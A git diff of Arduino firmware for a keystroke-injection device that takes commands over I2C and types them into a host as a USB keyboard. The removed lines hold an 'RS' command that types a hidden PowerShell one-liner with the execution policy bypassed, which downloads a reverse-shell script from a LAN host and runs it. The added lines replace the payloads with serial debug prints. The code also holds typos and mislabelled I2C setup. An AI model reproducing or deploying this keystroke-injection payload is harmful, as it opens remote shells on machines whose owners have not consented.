@@ -1,19 +1,19 @@
 #include <Wire.h>
 #include <Keyboard.h>
-#include "lib/Keyboard.h"
+//#include "lib/Keyboard.h"
 // #include "lib/simple-instructions.h"
-#include "lib/complex-instructions.h" 
+//#include "lib/complex-instructions.h"
 
 const int I2C_MASTER_ADDR = 0x08; // I2C address of the ESP32C6 (C6 board)
 const int ledPin = 13;
 
 void setup()
 {
-  Wire.begin(I2C_SLAVE_ADDR);   // Initialize I2C as slave
+  Wire.begin(I2C_MASTER_ADDR);   // Initialize I2C as slave
+  Keyboard.begin();             // Initialize the Keyboard library
   Wire.onReceive(receiveEvent); // Register the receive event handler
   Serial.begin(115200);         // Initialize Serial for debugging
-  Keyboard.begin();             // Initialize the Keyboard library
-  //Serial.println("SAMD21 ready to receive commands over I2C");
+  // Serial.println("SAMD21 ready to receive commands over I2C");
 }
 
 void loop()
@@ -37,20 +37,15 @@ void executeCommand(String command)
 {
   if (command == "RS")
   {
-    // Response [To be implemented]: sendResponse("Executing command [RS]");
-    // killall(); // Close all windows and stop all processes with a main window
-    // openPowerShellAdmin(); // Open Command Prompt as administrator
-    openPowerShell(); // Open Command Prompt
-    String payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://192.168.0.30/reverse_shell.ps1' -OutFile 'C:\\Users\\Public\\reverse_shell.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\reverse_shell.ps1'\"";
-    Keyboard.println(payload); 
-    // End the Keyboard
-    // Response [To be implemented]: sendResponse("Command [RS] executed successfully");
+    Serial.print("Recived command:" + command);
   }
   else if (command == "ent")
   {
-    openPowerShell(); // Open Command Prompt
-    String payload = ""
-    Keboard.println(payload); 
+    Serial.print("Recived command:" + command);
+  }
+  else if (command == "typ")
+  {
+    Serial.print("Recived command:" + command);
   }
   // Add more commands as needed
 }
